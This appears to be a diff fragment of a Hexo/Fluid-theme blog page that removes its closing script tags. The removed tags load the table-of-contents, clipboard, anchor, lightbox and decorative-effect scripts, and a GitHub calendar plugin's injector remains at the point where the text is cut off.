-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
 <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
